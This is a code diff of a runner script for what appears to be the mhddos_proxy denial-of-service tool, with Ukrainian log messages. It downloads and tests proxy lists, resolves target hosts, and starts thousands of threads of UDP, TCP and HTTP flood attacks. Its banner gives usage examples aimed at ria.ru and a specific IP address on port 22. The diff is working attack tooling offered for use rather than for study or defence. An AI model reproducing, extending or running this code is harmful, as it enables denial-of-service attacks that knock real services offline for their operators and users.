@@ -1,15 +1,18 @@
 import argparse
 import os
 import random
+import socket
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from functools import lru_cache
 from multiprocessing import cpu_count
 from threading import Thread
 
 import requests
 from PyRoxy import Proxy
+from yarl import URL
 
-from mhddos.start import logger, Methods, bcolors, main as mhddos_main
+from mhddos.start import logger, Methods, bcolors as cl, main as mhddos_main
 
 
 PROXIES_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/proxies.txt'
@@ -19,6 +22,14 @@ LOW_RPC = 1000
 
 THREADS_PER_CORE = 1000
 MAX_DEFAULT_THREADS = 4000
+
+
+@lru_cache
+def resolve_host(url):
+    try:
+        return socket.gethostbyname(URL(url).host)
+    except socket.gaierror:
+        exit(f'Невалідна ціль {url} - перевірте правильність написання')
 
 
 class Targets:
@@ -71,17 +82,17 @@ def update_proxies(period, targets):
     if os.path.exists('files/proxies/proxies.txt'):
         last_update = os.path.getmtime('files/proxies/proxies.txt')
         if (time.time() - last_update) < period / 2:
-            logger.info(f'{bcolors.OKGREEN}Використовується список проксі з попереднього запуску{bcolors.RESET}')
+            logger.info(f'{cl.OKGREEN}Використовується список проксі з попереднього запуску{cl.RESET}')
             return
 
-    logger.info(f'{bcolors.OKGREEN}Завантажуємо список проксі...{bcolors.RESET}')
+    logger.info(f'{cl.OKGREEN}Завантажуємо список проксі...{cl.RESET}')
     Proxies = list(download_proxies())
     random.shuffle(Proxies)
 
     size = len(targets)
     logger.info(
-        f'{bcolors.WARNING}Перевіряємо на працездатність {bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING}'
-        f' проксі - це може зайняти пару хвилин:{bcolors.RESET}'
+        f'{cl.WARNING}Перевіряємо на працездатність {cl.OKBLUE}{len(Proxies):,}{cl.WARNING}'
+        f' проксі - це може зайняти пару хвилин:{cl.RESET}'
     )
 
     future_to_proxy = {}
@@ -105,7 +116,7 @@ def update_proxies(period, targets):
         )
         exit()
 
-    logger.info(f'{bcolors.WARNING}Знайдено робочих проксі: {bcolors.OKBLUE}{len(CheckedProxies):,}{bcolors.RESET}')
+    logger.info(f'{cl.WARNING}Знайдено робочих проксі: {cl.OKBLUE}{len(CheckedProxies):,}{cl.RESET}')
 
     os.makedirs('files/proxies/', exist_ok=True)
     with open('files/proxies/proxies.txt', 'w') as wr:
@@ -118,42 +129,37 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug)
     params_list = []
     proxy_file = 'empty.txt' if vpn_mode else 'proxies.txt'
     for target in targets:
+        ip = resolve_host(target)
         # UDP
         if target.lower().startswith('udp://'):
             logger.warning(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
-            params_list.append([
-                'UDP', target[6:], str(UDP_THREADS), str(period)
-            ])
+            params_list.append(['UDP', target, ip, UDP_THREADS, period])
 
         # TCP
         elif target.lower().startswith('tcp://'):
-            params_list.append([
-                'TCP', target[6:], str(threads_per_target), str(period), '0', proxy_file
-            ])
+            params_list.append(['TCP', target, ip, threads_per_target, period, proxy_file])
 
         # HTTP(S)
         else:
             threads = threads_per_target // len(http_methods)
             for method in http_methods:
-                params_list.append([
-                    method, target, '0', str(threads), proxy_file, str(rpc), str(period)
-                ])
+                params_list.append([method, target, ip, threads, period, proxy_file, rpc])
 
-    logger.info(f'{bcolors.OKGREEN}Запускаємо атаку...{bcolors.RESET}')
+    logger.info(f'{cl.OKGREEN}Запускаємо атаку...{cl.RESET}')
     for params in params_list:
-        if debug:
-            params.append('true')
-        Thread(target=mhddos_main, args=(['', *params],), daemon=True).start()
+        Thread(target=mhddos_main, args=params, kwargs={'debug': debug}, daemon=True).start()
     time.sleep(period + 3)
 
 
-def start(total_threads, period, targets, rpc, http_methods, vpn_mode, debug):
+def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode, debug):
     os.chdir('mhddos')
     while True:
-        resolved = list(targets)
-        if not resolved:
+        targets = list(targets_iter)
+        if not targets:
             logger.error('Must provide either targets or a valid config file')
             exit()
+        for target in targets:
+            resolve_host(target)
 
         if rpc < LOW_RPC:
             logger.warning(
@@ -161,10 +167,10 @@ def start(total_threads, period, targets, rpc, http_methods, vpn_mode, debug):
                 f'через збільшення кількості перемикань кожного потоку між проксі.'
             )
 
-        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in resolved)
+        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
         if not no_proxies:
-            update_proxies(period, resolved)
-        run_ddos(resolved, total_threads, period, rpc, http_methods, vpn_mode, debug)
+            update_proxies(period, targets)
+        run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug)
 
 
 def init_argparse() -> argparse.ArgumentParser:
@@ -225,15 +231,15 @@ def init_argparse() -> argparse.ArgumentParser:
 
 def print_banner(vpn_mode):
     print(f'''
-                            !!!{'УВІМКНІТЬ VPN!!!' if vpn_mode else 'ВИМКНІТЬ VPN!!!  (окрім UDP атак)'}
+                            {cl.FAIL}!!!{'УВІМКНІТЬ VPN!!!' if vpn_mode else 'ВИМКНІТЬ VPN!!!  (окрім UDP атак)'}{cl.RESET}
 
-- Навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
+- {cl.WARNING}Навантаження{cl.RESET} - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
     python3 runner.py -t 3000 https://ria.ru tcp://194.54.14.131:22
 
-- Інформація про хід атаки - прапорець `--debug`
+- {cl.WARNING}Інформація про хід атаки{cl.RESET} - прапорець `--debug`
     python3 runner.py --debug https://ria.ru tcp://194.54.14.131:22
 
-- Повна документація - https://github.com/porthole-ascend-cinnamon/mhddos_proxy
+- {cl.WARNING}Повна документація{cl.RESET} - https://github.com/porthole-ascend-cinnamon/mhddos_proxy
     ''')
 
 
